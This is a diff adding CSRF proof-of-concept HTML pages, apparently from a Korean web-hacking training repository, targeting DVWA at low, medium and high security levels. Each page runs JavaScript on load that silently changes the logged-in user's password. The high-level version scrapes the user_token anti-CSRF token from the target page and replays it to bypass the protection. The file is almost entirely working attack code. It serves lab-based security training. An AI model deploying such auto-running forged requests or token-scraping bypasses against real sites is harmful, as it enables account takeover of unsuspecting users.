@@ -1,0 +1,119 @@
+https://github.com/SecuAcademy/webhacking
+<!--low-->
+<html>
+<meta charset="UTF-8">
+<head>
+</head>
+
+<script>
+
+    function poc() {
+
+        var host='localhost';
+
+        var req_uri = "http://" + host + "/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#";
+        var xmlhttp = new XMLHttpRequest();
+
+        xmlhttp.open("GET",req_uri,true);
+        xmlhttp.withCredentials = "true";
+
+        xmlhttp.send();
+    }
+
+</script>
+
+<body>
+(CSRF 공격 예제)<br />
+이미 비밀번호는 바뀌었습니다.<br />
+<script>
+poc()
+</script>
+
+</body>
+</html>
+
+
+
+
+<!--middle 파일이름을 사이트의 아이피를 추가하여 코드를 코른다-->
+<html>
+<meta charset="UTF-8">
+<head>
+</head>
+
+<script>
+
+    function poc() {
+
+        var host='localhost';
+
+        var req_uri = "http://" + host + "/DVWA/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change#";
+        var xmlhttp = new XMLHttpRequest();
+
+        xmlhttp.open("GET",req_uri,true);
+        xmlhttp.withCredentials = "true";
+
+        xmlhttp.send();
+    }
+
+</script>
+
+<body>
+(CSRF 공격 예제)<br />
+이미 비밀번호는 바뀌었습니다.<br />
+<script>
+poc()
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+<!--high 유저토큰 우회-->
+<html>
+<meta charset="UTF-8">
+<head>
+</head>
+
+<script>
+  var xhr;
+  var host='';
+  var dvwa= 'http://' +host+'/DVWA/vulnerabilities/csrf/';
+
+  function req1() {
+    xhr=new XMLHttpRequest();
+    xhr.onreadystatechange=function(){
+      if (this.readyState === 4 && this.status === 200) {
+        var htmltext = this.responseText;               //변수를 text로 받는다
+        var parser = new DOMParser();                   //DOM 객체
+        var htmlDOC = parser.parseFromString(htmltext, 'text/html');    //
+        var csrftoken = htmlDOC.getElementsByName('user_token')[0].value;
+        xhr = new XMLHttpRequest();
+        xhr.open('GET', dvwa + '?password_new=acd1&password_conf=acd1&Change=Change&user_token=' + csrftoken);
+        xhr.send();
+      }
+    };
+    xhr.open("GET",dvwa,true);
+    xhr.send();
+  }
+
+
+</script>
+
+<body>
+(CSRF 공격 예제)<br />
+이미 비밀번호는 바뀌었습니다.<br />
+<script>
+  req1();
+
+</script>
+
+
+
+<!--impossible 피싱 사이트-->
